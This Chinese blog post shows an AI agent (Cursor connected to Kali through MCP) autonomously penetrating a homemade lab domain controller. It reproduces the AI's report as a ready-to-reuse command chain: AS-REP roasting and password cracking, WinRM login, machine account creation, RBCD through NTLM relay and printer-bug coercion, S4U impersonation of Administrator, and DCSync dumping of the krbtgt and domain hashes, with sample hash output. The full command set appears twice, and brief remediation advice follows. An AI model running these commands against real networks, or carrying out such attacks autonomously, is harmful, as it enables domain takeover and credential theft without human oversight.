---
title: "MCP-Kali-Server & Cursor 全自动化渗透"
source: wechat
url: https://mp.weixin.qq.com/s/coF4ES-6_j-RmRhsa6zDZA
author: Wh1teSu
pub_date: 2025年8月24日 07:45
created: 2026-01-17 22:26
tags: [AI, 编程]
---

# MCP-Kali-Server & Cursor 全自动化渗透

> 作者: Wh1teSu | 发布日期: 2025年8月24日 07:45
> 原文链接: [点击查看](https://mp.weixin.qq.com/s/coF4ES-6_j-RmRhsa6zDZA)

---

前言

群里面几乎每天会有师傅自制靶机然后给群友们打，演示的这台靶机是wackymaker师傅自制的，然后在群里看见bamuwe师傅用AI自动化渗透打通了，刚好在微信上看到有一段聊天记录说是AI能解DEFCON CTF的逆向题，然后我也尝试了一下用MCP-Kali-Server & Cursor进行全自动化渗透，发现还真的可以，确实有点牛逼了.......

环境搭建

Wh0am123/MCP-Kali-Server: MCP configuration to connect AI agent to a Linux machine.

kali_server.py放kali里面运行

mcp_server.py安装好库，记住路径

ctrl+shift+j

创建一个mcp.json

{
"mcpServers":{
"kali-mcp":{
"command":"cmd",
"args":[
"/c",
"python",
"C:\\Users\\35031\\Desktop\\Edge\\MCP-Kali-Server-security\\mcp_server.py",
"--server",
"http://192.168.6.130:5000"
],
"timeout":3600
}
}
}


服务端就是kali的地址

提示词
对Windows主机192.168.6.134进行渗透，通过枚举等手段先获取低权限用户，然后再提权到管理员，最后给我输出中文报告

过程

环境说明：攻击机 Kali（示例 IP：192.168.6.130），目标 DC：dc.novice.com（192.168.6.134），域：NOVICE / novice.com。以下步骤均在授权演练环境中完成与验证，命令可直接复用。

一、目标与范围

目标主机：dc.novice.com（192.168.6.134），角色：域控（Active Directory）

域信息：NetBIOS NOVICE，DNS 后缀 novice.com

范围：使用 Kerberos/LDAP/WinRM/SMB/RPC 等常见端口与协议

二、关键信息与资产发现（核验命令）

端口/服务核验

nmap -Pn -n -sT -p53,88,135,139,445,389,636,3268,3269,5985,9389 192.168.6.134


域/LDAP 基础、命名上下文与域 SID

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com""objectClass=domain" objectSid namingContexts


打印机服务（强制认证面）

impacket-rpcdump 192.168.6.134 | grep -i 'MS-RPRN\|MS-PAR' | cat


SYSVOL 列目录（GPP 快速自检）

smbclient //192.168.6.134/SYSVOL -U 'NOVICE.COM/MrRobot%mrroboto12' -c 'recurse ON; ls'

三、初始进入与凭据获取（已验证）

AS-REP Roast → 获取并破解 MrRobot 明文

# 抓取 AS-REP（禁用预认证用户）
impacket-GetNPUsers novice.com/ -dc-ip 192.168.6.134 -request -format hashcat -outputfile /tmp/asrep.hashes

# 破解
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asrep.hashes
# 明文：MrRobot / mrroboto12


WinRM 登录与权限确认

evil-winrm -i 192.168.6.134 -u MrRobot -p 'mrroboto12'
# 会话中：
whoami
whoami /all


LDAP 绑定只读拉取对象

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com""(objectClass=user)" sAMAccountName userAccountControl

四、域内枚举（只读面）

Kerberoast 候选（本环境无可用 SPN）

impacket-GetUserSPNs NOVICE.COM/MrRobot:mrroboto12 -dc-ip 192.168.6.134 -request -output /tmp/kerberoast.txt
# 若输出 “No entries found!” 则无可Kerberoast目标


SYSVOL/GPP 凭据（未发现 cpassword）

mkdir -p /tmp/sysvol && cd /tmp/sysvol
smbclient //192.168.6.134/SYSVOL -U 'NOVICE.COM/MrRobot%mrroboto12' \
  -c 'recurse ON; prompt OFF; mget *Groups.xml *Services.xml *ScheduledTasks.xml'
grep -Rin "cpassword" .


MachineAccountQuota（MAQ）为 10（允许普通用户创建计算机对象）

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com""(objectClass=domainDNS)" ms-DS-MachineAccountQuota


BloodHound 采集（可选）

python3 -m venv /tmp/venv && /tmp/venv/bin/pip install --quiet bloodhound
/tmp/venv/bin/bloodhound-python -d NOVICE.COM -u MrRobot -p 'mrroboto12' \
  -ns 192.168.6.134 -c All --zip --output /tmp/bh

五、提权路径：RBCD（新增机器账户 + 写入委派 + S4U）

说明：利用 MAQ=10 新建机器账号，将其加入 DC$ 的 RBCD，最后通过 S4U 伪造 Administrator 服务票据获得 DA 上下文。

5.1 新建机器账户
impacket-addcomputer -dc-ip 192.168.6.134 -domain novice.com \
  -computer-name WS485$ -computer-pass 'P@ssw0rd123!' \
  novice.com/MrRobot:'mrroboto12'
# 期望输出：[*] Successfully added machine account WS485$


验证对象存在

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com""(sAMAccountName=WS485$)" dn

5.2 RBCD 写入（两种方式）

方式A：直接写入（若权限足够）

impacket-rbcd -dc-ip 192.168.6.134 -action write \
  -delegate-to 'DC$' -delegate-from 'WS485$' \
  novice.com/MrRobot:'mrroboto12'


方式B：NTLM 中继至 LDAP 一键落地（常用实战路径）

# 1) 开启中继（写 RBCD 并设置 WS485$ 为可委派主体）
impacket-ntlmrelayx -t ldap://192.168.6.134 --delegate-access --escalate-user 'WS485$' -smb2support

# 2) 触发强制认证（例如打印机接口，或使用 Coercer 扫描&触发）
python3 -m venv /tmp/venv && /tmp/venv/bin/pip install --quiet coercer
/tmp/venv/bin/coercer coerce -t 192.168.6.134 \
  -u NOVICE\\MrRobot -p 'mrroboto12' -l 192.168.6.130
# 观察 ntlmrelayx 输出，确认 RBCD 写入成功


RBCD 验证（读取 DC$ 的允许委派列表）

impacket-rbcd -dc-ip 192.168.6.134 -action read \
  -delegate-to 'DC$' -delegate-from 'WS485$' \
  novice.com/MrRobot:'mrroboto12'

六、S4U 获取管理员服务票据并验证高权

获取 WS485$ 的 TGT

impacket-getTGT novice.com/WS485\$:'P@ssw0rd123!' -dc-ip 192.168.6.134
# 生成 WS485$.ccache


计算 WS485$ NT 哈希（便于 -hashes 传参）

NT=$(echo -n 'P@ssw0rd123!' | iconv -t utf16le | openssl dgst -md4 -binary | xxd -p)
echo$NT


申请 Administrator 的目标服务票据（S4U2Self + S4U2Proxy）

# LDAP 票据（用于 DCSync）
KRB5CCNAME='WS485$.ccache' impacket-getST -spn ldap/dc.novice.com novice.com/WS485\$ \
  -dc-ip 192.168.6.134 -impersonate Administrator -hashes :$NT

# CIFS 票据（用于 SMB / 远程执行）
KRB5CCNAME='WS485$.ccache' impacket-getST -spn cifs/dc.novice.com novice.com/WS485\$ \
  -dc-ip 192.168.6.134 -impersonate Administrator -hashes :$NT

# HOST 票据（用于 WMI/RPC）
KRB5CCNAME='WS485$.ccache' impacket-getST -spn host/dc.novice.com novice.com/WS485\$ \
  -dc-ip 192.168.6.134 -impersonate Administrator -hashes :$NT


验证管理员上下文（以 Kerberos 执行命令）

# 使用 CIFS 票据：
KRB5CCNAME='Administrator@cifs_dc.novice.com@NOVICE.COM.ccache' \
  impacket-wmiexec -k -no-pass Administrator@dc.novice.com "whoami && whoami /all"

七、凭据导出（DCSync / krbtgt 密钥）

导出全域 NTLM（DRSUAPI 方法）

KRB5CCNAME='Administrator@cifs_dc.novice.com@NOVICE.COM.ccache' \
  impacket-secretsdump -just-dc-ntlm -k \
  -dc-ip 192.168.6.134 -target-ip 192.168.6.134 \
  novice.com/Administrator@dc.novice.com


仅导出 krbtgt（含 AES 密钥）

KRB5CCNAME='Administrator@host_dc.novice.com@NOVICE.COM.ccache' \
  impacket-secretsdump -just-dc-user krbtgt -k \
  -dc-ip 192.168.6.134 -target-ip 192.168.6.134 \
  novice.com/Administrator@dc.novice.com


示例结果（节选）

Administrator:500:aad3b435...:bbabdc192282668fe5190ab0c5150b34:::
krbtgt:502:aad3b435...:34d77123d1c64e2da30028f21bbb91d0:::
MrRobot:1104:aad3b435...:c8fa8686516464c51cfc0bdc3e52ef9e:::
DC$:1000:aad3b435...:875fa9120ded7e007611cb9e598459ec:::

krbtgt:aes256-cts-hmac-sha1-96:1767397277e40d45c7924647e4b2ce3b211a87bbe5aa345beba0cb95886d696f
krbtgt:aes128-cts-hmac-sha1-96:ab93922b57ce1a5ab5e6e8f4ea078f4e

八、清理与回滚

删除 DC$ 上 WS485$ 的 RBCD 条目

impacket-rbcd -dc-ip 192.168.6.134 -action remove \
  -delegate-to 'DC$' -delegate-from 'WS485$' \
  novice.com/MrRobot:'mrroboto12'


删除新增计算机对象 WS485$（需管理员权限）

impacket-addcomputer -dc-ip 192.168.6.134 -domain novice.com -delete \
  novice.com/Administrator:'<AdminPwd>' -computer-name WS485$


终止中继/触发器（如在后台运行）

pkill -f impacket-ntlmrelayx || true
pkill -f coercer || true

九、风险评估与整改建议（要点）

高风险

MachineAccountQuota=10 使低权用户可新建计算机对象；结合 RBCD/S4U 可快速获得 DA

打印机服务（MS-RPRN/MS-PAR）可被强制认证，便于中继到 LDAP 写入 RBCD

域管/krbtgt 等哈希与密钥泄露，存在伪造票据与持久化风险

修复建议

立即轮换 Administrator、krbtgt（连续滚动两次）、关键服务账户与 DC$ 密码

将 MachineAccountQuota 调整为 0；委派/RBCD 全量清理并最小化

限制或关闭 DC 打印机服务；开启 LDAP 签名与 Channel Binding；限制 WinRM 范围

部署告警：RBCD 变更、S4U/S4U2Proxy 异常、DCSync、异常 GPO 修改；定期 BloodHound 审计

十、附录：常见等价命令/排错

Impacket 可执行名差异：部分系统为 impacket-GetNPUsers、impacket-secretsdump 等

Kerberos 目标名问题：优先 FQDN（如 dc.novice.com），并同时使用 -dc-ip 与 -target-ip

触发强制认证的替代方案（若存在脚本路径）

python3 /usr/share/doc/python3-impacket/examples/printerbug.py \
  NOVICE.COM/MrRobot:mrroboto12@192.168.6.134 192.168.6.130


关键链路回顾

MrRobot 明文 → LDAP/WinRM 只读落地 → MAQ=10 新建 WS485$ → RBCD 写入 DC$ → S4U 伪造 Administrator → DCSync/导出 krbtgt/全域 NTLM → 回滚RBCD/删除对象（需管理员）

nmap -Pn -n -sT -p53,88,135,139,445,389,636,3268,3269,5985,9389 192.168.6.134

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com" "objectClass=domain" objectSid namingContexts

impacket-rpcdump 192.168.6.134 | grep -i 'MS-RPRN\|MS-PAR' | cat

smbclient //192.168.6.134/SYSVOL -U 'NOVICE.COM/MrRobot%mrroboto12' -c 'recurse ON; ls'

# 抓取 AS-REP（禁用预认证用户）
impacket-GetNPUsers novice.com/ -dc-ip 192.168.6.134 -request -format hashcat -outputfile /tmp/asrep.hashes

# 破解
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asrep.hashes
# 明文：MrRobot / mrroboto12

evil-winrm -i 192.168.6.134 -u MrRobot -p 'mrroboto12'
# 会话中：
whoami
whoami /all

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com" "(objectClass=user)" sAMAccountName userAccountControl

impacket-GetUserSPNs NOVICE.COM/MrRobot:mrroboto12 -dc-ip 192.168.6.134 -request -output /tmp/kerberoast.txt
# 若输出 “No entries found!” 则无可Kerberoast目标

mkdir -p /tmp/sysvol && cd /tmp/sysvol
smbclient //192.168.6.134/SYSVOL -U 'NOVICE.COM/MrRobot%mrroboto12' \
  -c 'recurse ON; prompt OFF; mget *Groups.xml *Services.xml *ScheduledTasks.xml'
grep -Rin "cpassword" .

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com" "(objectClass=domainDNS)" ms-DS-MachineAccountQuota

python3 -m venv /tmp/venv && /tmp/venv/bin/pip install --quiet bloodhound
/tmp/venv/bin/bloodhound-python -d NOVICE.COM -u MrRobot -p 'mrroboto12' \
  -ns 192.168.6.134 -c All --zip --output /tmp/bh

impacket-addcomputer -dc-ip 192.168.6.134 -domain novice.com \
  -computer-name WS485$ -computer-pass 'P@ssw0rd123!' \
  novice.com/MrRobot:'mrroboto12'
# 期望输出：[*] Successfully added machine account WS485$

ldapsearch -LLL -x -H ldap://192.168.6.134 \
  -D "NOVICE\\MrRobot" -w "mrroboto12" \
  -b "DC=novice,DC=com" "(sAMAccountName=WS485$)" dn

impacket-rbcd -dc-ip 192.168.6.134 -action write \
  -delegate-to 'DC$' -delegate-from 'WS485$' \
  novice.com/MrRobot:'mrroboto12'

# 1) 开启中继（写 RBCD 并设置 WS485$ 为可委派主体）
impacket-ntlmrelayx -t ldap://192.168.6.134 --delegate-access --escalate-user 'WS485$' -smb2support

# 2) 触发强制认证（例如打印机接口，或使用 Coercer 扫描&触发）
python3 -m venv /tmp/venv && /tmp/venv/bin/pip install --quiet coercer
/tmp/venv/bin/coercer coerce -t 192.168.6.134 \
  -u NOVICE\\MrRobot -p 'mrroboto12' -l 192.168.6.130
# 观察 ntlmrelayx 输出，确认 RBCD 写入成功

impacket-rbcd -dc-ip 192.168.6.134 -action read \
  -delegate-to 'DC$' -delegate-from 'WS485$' \
  novice.com/MrRobot:'mrroboto12'

impacket-getTGT novice.com/WS485\$:'P@ssw0rd123!' -dc-ip 192.168.6.134
# 生成 WS485$.ccache

NT=$(echo -n 'P@ssw0rd123!' | iconv -t utf16le | openssl dgst -md4 -binary | xxd -p)
echo $NT

# LDAP 票据（用于 DCSync）
KRB5CCNAME='WS485$.ccache' impacket-getST -spn ldap/dc.novice.com novice.com/WS485\$ \
  -dc-ip 192.168.6.134 -impersonate Administrator -hashes :$NT

# CIFS 票据（用于 SMB / 远程执行）
KRB5CCNAME='WS485$.ccache' impacket-getST -spn cifs/dc.novice.com novice.com/WS485\$ \
  -dc-ip 192.168.6.134 -impersonate Administrator -hashes :$NT

# HOST 票据（用于 WMI/RPC）
KRB5CCNAME='WS485$.ccache' impacket-getST -spn host/dc.novice.com novice.com/WS485\$ \
  -dc-ip 192.168.6.134 -impersonate Administrator -hashes :$NT

# 使用 CIFS 票据：
KRB5CCNAME='Administrator@cifs_dc.novice.com@NOVICE.COM.ccache' \
  impacket-wmiexec -k -no-pass Administrator@dc.novice.com "whoami && whoami /all"

KRB5CCNAME='Administrator@cifs_dc.novice.com@NOVICE.COM.ccache' \
  impacket-secretsdump -just-dc-ntlm -k \
  -dc-ip 192.168.6.134 -target-ip 192.168.6.134 \
  novice.com/Administrator@dc.novice.com

KRB5CCNAME='Administrator@host_dc.novice.com@NOVICE.COM.ccache' \
  impacket-secretsdump -just-dc-user krbtgt -k \
  -dc-ip 192.168.6.134 -target-ip 192.168.6.134 \
  novice.com/Administrator@dc.novice.com

Administrator:500:aad3b435...:bbabdc192282668fe5190ab0c5150b34:::
krbtgt:502:aad3b435...:34d77123d1c64e2da30028f21bbb91d0:::
MrRobot:1104:aad3b435...:c8fa8686516464c51cfc0bdc3e52ef9e:::
DC$:1000:aad3b435...:875fa9120ded7e007611cb9e598459ec:::

krbtgt:aes256-cts-hmac-sha1-96:1767397277e40d45c7924647e4b2ce3b211a87bbe5aa345beba0cb95886d696f
krbtgt:aes128-cts-hmac-sha1-96:ab93922b57ce1a5ab5e6e8f4ea078f4e

impacket-rbcd -dc-ip 192.168.6.134 -action remove \
  -delegate-to 'DC$' -delegate-from 'WS485$' \
  novice.com/MrRobot:'mrroboto12'

impacket-addcomputer -dc-ip 192.168.6.134 -domain novice.com -delete \
  novice.com/Administrator:'<AdminPwd>' -computer-name WS485$

pkill -f impacket-ntlmrelayx || true
pkill -f coercer || true

python3 /usr/share/doc/python3-impacket/examples/printerbug.py \
  NOVICE.COM/MrRobot:mrroboto12@192.168.6.134 192.168.6.130

结果

---
*导入时间: 2026-01-17 22:26:44*
